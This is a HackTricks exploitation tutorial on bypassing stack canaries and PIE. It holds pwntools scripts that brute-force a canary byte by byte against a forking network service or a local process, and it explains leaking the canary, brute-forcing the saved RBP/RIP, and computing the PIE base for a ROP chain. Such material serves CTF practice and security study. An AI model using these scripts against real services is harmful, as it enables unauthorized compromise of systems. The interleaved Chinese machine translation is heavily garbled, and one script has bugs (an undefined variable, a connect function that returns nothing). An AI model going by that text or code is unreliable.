

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


**If you are facing a binary protected by a canary and PIE (Position Independent Executable) you probably need to find a way to bypass them.**

**如果您面对受金丝雀和派（独立执行位置）保护的二进制，您可能需要找到一种绕过它们的方法。**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}

{％提示样式=“ info”％}
Note that **`checksec`** might not find that a binary is protected by a canary if this was statically compiled and it's not capable to identify the function.\

请注意，**``checksec` **'**可能没有发现如果静态编译并且无法识别该功能，则可能没有发现二进制。
However, you can manually notice this if you find that a value is saved in the stack at the begging of a function call and this value is checked before exiting.

但是，如果您发现在函数调用的乞讨中发现一个值保存在堆栈中，并且在退出之前检查了此值，则可以手动注意到这一点。
{% endhint %}

# Brute force Canary

＃蛮力的金丝雀

The best way to bypass a simple canary is if the binary is a program **forking child processes every time you establish a new connection** with it (network service), because every time you connect to it **the same canary will be used**.

绕过简单金丝雀的最佳方法是，二进制是一个程序**分叉的儿童处理，每次您建立新的连接**（网络服务），因为每次您连接到它** ** **相同的金丝雀都会 用过的**。

Then, the best way to bypass the canary is just to **brute-force it char by char**, and you can figure out if the guessed canary byte was correct checking if the program has crashed or continues its regular flow. In this example the function **brute-forces an 8 Bytes canary (x64)** and distinguish between a correct guessed byte and a bad byte just **checking** if a **response** is sent back by the server (another way in **other situation** could be using a **try/except**):

然后，绕过金丝雀的最佳方法是通过char ** brute-force it char **，您可以弄清楚猜测的金丝雀字节是否正确检查程序是否已崩溃或继续定期流动。 在此示例中，函数**蛮力是8个字节金丝雀（x64）**，并区分正确的猜测字节和不良字节，只是**检查** ** **响应**由服务器发送回**（ **其他情况**可能会使用**尝试/除外**）：

## Example 1

This example is implemented for 64bits but could be easily implemented for 32 bits.

此示例用于64个bit，但可以轻松实现32位。

```python
from pwn import *

def connect():
    r = remote("localhost", 8788)

def get_bf(base):
    canary = ""
    guess = 0x0
    base += canary

    while len(canary) < 8:
        while guess != 0xff:
            r = connect()

            r.recvuntil("Username: ")
            r.send(base + chr(guess))

            if "SOME OUTPUT" in r.clean():
                print "Guessed correct byte:", format(guess, '02x')
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()

    print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
    return base
    
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```

## Example 2

This is implemented for 32 bits, but this could be easily changed to 64bits.\

这是针对32位实施的，但可以轻松地更改为64位。\ \
Also note that for this example the **program expected first a byte to indicate the size of the input** and the payload.

另请注意，在此示例中，**程序预计首先要指示输入**和有效载荷的大小。

```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
	known_canary = b""
	test_canary = 0x0
	len_bytes_to_read = 0x21
	
	for j in range(0, 4):
		# Iterate up to 0xff times to brute force all posible values for byte
		for test_canary in range(0xff):
			print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")
			
			# Send the current input size
			target.send(len_bytes_to_read.to_bytes(1, "little"))

			# Send this iterations canary
			target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

			# Scan in the output, determine if we have a correct value
			output = target.recvuntil(b"exit.")
			if b"YUM" in output:
				# If we have a correct value, record the canary value, reset the canary value, and move on
				print(" - next byte is: " + hex(test_canary))
				known_canary = known_canary + test_canary.to_bytes(1, "little")
				len_bytes_to_read += 1
				break

	# Return the canary
	return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```

# Print Canary

＃打印金丝雀

Another way to bypass the canary is to **print it**.\

绕过金丝雀的另一种方法是**打印**。
Imagine a situation where a **program vulnerable** to stack overflow can execute a **puts** function **pointing** to **part** of the **stack overflow**. The attacker knows that the **first byte of the canary is a null byte** (`\x00`) and the rest of the canary are **random** bytes. Then, the attacker may create an overflow that **overwrites the stack until just the first byte of the canary**.\

想象一下，一个**程序易受伤害**堆叠溢出可以执行** put **函数**指向** part ** **堆栈溢出**的零件**。 攻击者知道，金丝雀的第一个字节是一个null字节**（\ x00`），其余的金丝雀是**随机**字节。 然后，攻击者可能会创建一个溢出，以覆盖堆栈，直到金丝雀**的第一个字节。
Then, the attacker **calls the puts functionalit**y on the middle of the payload which will **print all the canary** (except from the first null byte).\

然后，攻击者**调用有效载荷中间的puts functionitiit ** y，它将**打印所有金丝雀**（除了第一个null字节外）。\ \ \ \
With this info the attacker can **craft and send a new attack** knowing the canary (in the same program session)

借助此信息，攻击者可以**工艺并发送新的攻击**知道金丝雀（在同一程序会话中）

Obviously, this tactic is very **restricted** as the attacker needs to be able to **print** the **content** of his **payload** to **exfiltrate** the **canary** and then be able to create a new payload (in the **same program session**) and **send** the **real buffer overflow**.\

显然，这种策略非常**受到限制**，因为攻击者需要**打印**的** poragload ** ** explatrate ** ** exfiltrate ** ** canary ** 然后能够创建一个新的有效载荷（在**相同的程序会话中**），然后**发送** **真实的缓冲区溢出**。\ \ \ \ \
CTF example: [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

In order to bypass the PIE you need to **leak some address**. And if the binary is not leaking any addresses the best to do it is to **brute-force the RBP and RIP saved in the stack** in the vulnerable function.\

为了绕过派，您需要**泄漏一些地址**。 而且，如果二进制文件没有泄漏任何地址，那么最好的做法就是** brute force rbp和RIP保存在脆弱功能中的堆栈**。\ \ \ \ \
For example, if a binary is protected using both a **canary** and **PIE**, you can start brute-forcing the canary, then the **next** 8 Bytes (x64) will be the saved **RBP** and the **next** 8 Bytes will be the saved **RIP.**

例如，如果同时使用**金丝雀**和** pie **保护二进制文件，则可以开始野蛮的金丝雀，那么**下一个** 8字节（x64）将是保存的** rbp **和**下一个** 8字节将是保存的** rip。**

To brute-force the RBP and the RIP from the binary you can figure out that a valid guessed byte is correct if the program output something or it just doesn't crash. The **same function** as the provided for brute-forcing the canary can be used to brute-force the RBP and the RIP:

要爆炸RBP和二进制中的RIP，您可以确定有效的猜测字节是正确的，如果程序输出某物或它不会崩溃。 **相同的功能**与野蛮锻炼所提供的金丝雀可用于蛮力rute the RBP和RIP：

```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```

## Get base address

The last thing you need to defeat the PIE is to calculate **useful addresses from the leaked** addresses: the **RBP** and the **RIP**.

打败馅饼所需的最后一件事是从泄漏的**地址计算**有用的地址：** rbp **和** rip **。

From the **RBP** you can calculate **where are you writing your shell in the stack**. This can be very useful to know where are you going to write the string _"/bin/sh\x00"_ inside the stack. To calculate the distance between the leaked RBP and your shellcode you can just put a **breakpoint after leaking the RBP** an check **where is your shellcode located**, then, you can calculate the distance between the shellcode and the RBP:

从** rbp **您可以计算**在堆栈中写下外壳**。 知道您要在哪里编写字符串_“/bin/sh \ x00” _ _内部的字符串，这可能非常有用。 要计算泄漏的RBP和ShellCode之间的距离，您只需在泄漏RBP ** outch ** ** shellCode **位于**的位置，就可以放置一个**断点，然后，您可以计算shellCode和RBP之间的距离 ：

```python
INI_SHELLCODE = RBP - 1152
```

From the **RIP** you can calculate the **base address of the PIE binary** which is what you are going to need to create a **valid ROP chain**.\

从** rip **您可以计算pie二进制**的基础地址，这是您需要创建一个**有效的ROP链**。
To calculate the base address just do `objdump -d vunbinary` and check the disassemble latest addresses:

要计算基本地址，只需执行“ objdump -d vunbinary”，然后检查拆卸的最新地址：

![](<../../.gitbook/assets/image (145).png>)

In that example you can see that only **1 Byte and a half is needed** to locate all the code, then, the base address in this situation will be the **leaked RIP but finishing on "000"**. For example if you leaked _0x562002970**ecf** _ the base address is _0x562002970**000**_

在该示例中，您可以看到只需要** 1字节和一半**来找到所有代码，然后，在这种情况下的基本地址将是**泄漏的RIP，但在“ 000” **上完成。 例如，如果您泄漏_0x562002970 ** ECF ** _基本地址是_0x562002970 ** 000 ** _ _

```python
elf.address = RIP - (RIP & 0xfff)
```


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


